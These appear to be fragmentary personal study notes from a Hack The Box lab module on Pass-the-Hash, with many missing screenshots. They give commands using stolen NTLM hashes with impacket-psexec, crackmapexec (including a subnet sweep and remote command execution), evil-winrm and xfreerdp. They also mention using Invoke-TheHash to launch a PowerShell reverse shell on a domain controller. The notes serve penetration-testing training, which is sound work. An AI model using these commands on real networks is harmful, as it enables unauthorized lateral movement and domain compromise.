...
```
![[Pasted image 20250527195011.png]]
...
![[Pasted image 20250527195022.png]]
...
![[Pasted image 20250527195052.png]]
...
![[Pasted image 20250527195109.png]]Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work).
...
![[Pasted image 20250527195135.png]]****
...
#### Pass the Hash with Impacket PsExec## Pass the Hash with Impacket (Linux)
...
```shell-session
pepedavidphone@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
...
```shell-session
pepedavidphone@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
...
```shell-session
pepedavidphone@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
...
```shell-session
pepedavidphone@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
...
- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
  ...
  ![[Pasted image 20250527195232.png]]
...
![[Pasted image 20250527195250.png]]Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

#### Pass the Hash Using RDP

```shell-session
pepedavidphone@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
![[Pasted image 20250527195304.png]]## UAC Limits Pass the Hash for Local Accounts
